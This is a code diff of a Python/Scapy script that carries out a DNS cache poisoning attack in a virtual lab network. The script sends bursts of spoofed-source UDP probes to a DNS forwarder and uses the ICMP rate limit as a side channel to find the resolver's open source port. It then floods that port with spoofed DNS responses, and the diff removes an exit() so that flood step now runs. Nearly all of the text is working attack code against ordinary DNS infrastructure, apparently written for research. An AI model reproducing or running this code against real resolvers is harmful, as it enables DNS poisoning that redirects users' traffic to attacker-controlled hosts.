@@ -9,36 +9,6 @@ from ipaddress import IPv6Network, IPv6Address
 from functools import wraps
 
 
-
-def get_random_domain():
-    '''
-    Return a random domain name from top 10K sites listed on the file
-    '''
-
-    random.seed(time.time())
-    filepath = 'opendns-top-domains.txt'
-    domain_names = []
-    with open(filepath) as fp:
-        for cnt, line in enumerate(fp):
-            domain_names.append(line)
-    return random.choice(domain_names)
-
-"""
-Generate a random IPv6 address for a specified subnet
-"""
-def random_ipv6_address():
-    subnet = 'fe80:800:27ff::/64'
-
-    random.seed(time.time())
-    network = IPv6Network(subnet)
-    address = IPv6Address(network.network_address + getrandbits(network.max_prefixlen - network.prefixlen))
-
-    print(address)
-    return address
-
-def to_milis_str(s):
-    return str(round(s * 1000)) + ' ms'
-
 forwarder_ip = '192.168.58.2'
 forwarder_port = 53
 resolver_ip = '192.168.58.3'
@@ -50,18 +20,20 @@ ICMP_recovering_time = .02 # 20 miliseconds
 sleep_time_for_ICMP_refresh = .05 # 50 ms
 wait_time_for_ICMP_reply = .05
 
-MIN_PORT_TO_SCAN = 2550
-MAX_PORT_TO_SCAN = 2600
+MIN_PORT_TO_SCAN = 50000
+MAX_PORT_TO_SCAN = 50100
 
 fixed_src_port_for_attack = 9556
-
-attack_burst_end_time = 0
 
 finished = 0
 
 timeout_for_dns_query = 20
 
 global_socket = conf.L2socket(iface='vboxnet2')
+
+
+def to_milis_str(s):
+    return str(round(s * 1000)) + ' ms'
 
 
 #https://stackoverflow.com/a/58135538/3450691
@@ -155,14 +127,14 @@ def step1(thread_id, lock):
 @profile
 def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding_packet):
 
-    print("do_one_attack_chunk " + str(port_start) + "," + str(number_of_probe_packet) +
-            "," + str(number_of_padding_packet))
+    print("attack_burst: (port_start, # of probe, # of padding):" + str(port_start) + 
+    "," + str(number_of_probe_packet) +
+    "," + str(number_of_padding_packet))
     
 
-    #print("Sleeping for 50ms")
     # this could be optimized
     # 
-    time.sleep(sleep_time_for_ICMP_refresh)
+    #time.sleep(sleep_time_for_ICMP_refresh)
 
     start_time = time.perf_counter()
 
@@ -171,21 +143,21 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     # generate all probe packets, padding_packets (if any) and the verification packet first
     # and then send those in a burst
     probe_packet = []
-    # What should be the actual source??? RandIP()??? Or the dns resolver??? Or any local IP???
+    
     for i in range(number_of_probe_packet):
         # Using spoofed ip
-        ip_layer = IP(dst=forwarder_ip, src=random.choice(local_free_ip))
+        ip_layer = IP(dst=forwarder_ip, src=RandIP())
         udp_layer = UDP(dport=now_port, sport=RandShort())
         packet = Ether() / ip_layer / udp_layer
         probe_packet.append(raw(packet))
         now_port += 1
 
     padding_packet = []
-    # What should be the actual source??? RandIP()??? Or the dns resolver??? Or any local IP???
+    
     for i in range(number_of_padding_packet):
         # Using spoofed ip
-        ip_layer = IP(dst=forwarder_ip, src=random.choice(local_free_ip))
-        udp_layer = UDP(dport=1, sport=fixed_src_port_for_attack)
+        ip_layer = IP(dst=forwarder_ip, src=RandIP())
+        udp_layer = UDP(dport=1, sport=RandShort())
         packet = Ether() / ip_layer / udp_layer
         padding_packet.append(raw(packet))
 
@@ -200,58 +172,36 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
 
     attack_burst_start_time = time.perf_counter()
 
-    global attack_burst_end_time
-    time_elapsed_after_last_attack = attack_burst_start_time - attack_burst_end_time
-
-    #if sleep_time_for_ICMP_refresh > time_elapsed_after_last_attack:
-    #    time.sleep(sleep_time_for_ICMP_refresh - time_elapsed_after_last_attack)
-
 
     start_time = time.perf_counter()
     for packet in probe_packet:
-        #send(packet, verbose=False)
         global_socket.send(packet)
     for packet in padding_packet:
-        #send(packet, verbose=False)
         global_socket.send(packet)
     elapsed_time = time.perf_counter() - start_time
-    #print ("Time needed for sending 50 packets: " + to_milis_str(elapsed_time))
 
-    #print("Sending verification packet")
 
     start_time = time.perf_counter()
-
     # This timeout is the crucial factor
     reply = global_socket.sr1(verification_packet, timeout=wait_time_for_ICMP_reply, verbose=False) # in seconds
-
     elapsed_time = time.perf_counter() - start_time
-    #print ("Time needed for sending and receiving verification packet: " + to_milis_str(elapsed_time))
-    #print("Got reply from verificaiton packet")
-    #print (reply.show())
-
 
     attack_burst_end_time = time.perf_counter()
+    elapsed_time_for_one_burst = attack_burst_end_time - attack_burst_start_time
 
 
-    # if timeout occurs even then the reply will be none
+    if sleep_time_for_ICMP_refresh > elapsed_time_for_one_burst:
+        time.sleep(sleep_time_for_ICMP_refresh - elapsed_time_for_one_burst)
+
+
+    # if timeout occurs, the reply will be none
     if reply == None:
         print ("No port is open. IMCP rate limit is already drained.")
         return -1
     else:
         if reply.haslayer(ICMP):
-            # Maybe need to check the error code also
             print("Yaaay, got ICMP port unreachable message. At least one port is open.")
-            #print (reply[ICMP].summary())
-            #print (reply[ICMP].show())
-            #print ("icmp code and type : " + 
-            #str(reply.getlayer(ICMP).code) + " " + str(reply.getlayer(ICMP).type))
             return port_start # important for the base condition of the binary search
-        '''
-        elif reply.haslayer(UDP):
-            print("Don't know what this means.")
-        else:
-            print("Unknown reply")
-        '''
 
     return 0 # for now
 
@@ -261,7 +211,6 @@ def binary_search(left, right):
     if left == right:
         return do_one_chunk_of_attack(left, 1, ICMP_limit_rate - 1)
 
-    # check the calculations carefully again
     ret1 = do_one_chunk_of_attack(left, mid - left + 1, ICMP_limit_rate - (mid - left + 1))
     if ret1 == left:
         return binary_search(left, mid)
@@ -287,8 +236,6 @@ def flood_the_port_with_spoofed_dns_response(actual_port):
 def step2(thread_id, source_port_range_start, source_port_range_end, lock):
     #need to run this file with sudo because of port 53
 
-    #print("thread id: " + str(thread_id))
-
     # Wait for the thread 1 to send the dns query first (aka, acruire the lock)
     while lock.locked() == False:
         None
@@ -296,13 +243,9 @@ def step2(thread_id, source_port_range_start, source_port_range_end, lock):
     start = source_port_range_start
 
     while lock.locked() and start + ICMP_limit_rate <= source_port_range_end:
-        #print("lock status: " + str(lock.locked()))
 
-        #for system wide time count + sleep also
-        #another option was time.process_time() (check)
         start_time_one_chunk = time.perf_counter()
         
-        #print("Calling do_one_attack_chunk")
         ret = do_one_chunk_of_attack(start, ICMP_limit_rate, 0)
         print("Got reply from do_one_attack_chunk : " + str(ret))
 
@@ -312,8 +255,7 @@ def step2(thread_id, source_port_range_start, source_port_range_end, lock):
             # found the port
             if port > 0:
 
-                print ("---------------------found the exact port.--------------")
-                exit()
+                print ("---------------found the exact port.--------------")
 
                 result = flood_the_port_with_spoofed_dns_response(port)
                 if result == True:
@@ -325,7 +267,7 @@ def step2(thread_id, source_port_range_start, source_port_range_end, lock):
         end_time_one_chunk = time.perf_counter()
         time_elapsed_for_one_chunk = end_time_one_chunk - start_time_one_chunk
 
-        print ("System wide time needed in this loop once: " + to_milis_str(time_elapsed_for_one_chunk))
+        print ("time needed in this iteration of loop: " + to_milis_str(time_elapsed_for_one_chunk))
 
         start += ICMP_limit_rate
 
@@ -353,8 +295,6 @@ def main():
         t1 = threading.Thread(target=step1, args=(2 * iteration - 1, lock))
         t1.start()
 
-        global attack_burst_end_time
-        attack_burst_end_time = time.perf_counter()
         t2 = threading.Thread(target=step2, args=(2 * iteration, MIN_PORT_TO_SCAN,
                             MAX_PORT_TO_SCAN, lock))
         t2.start()
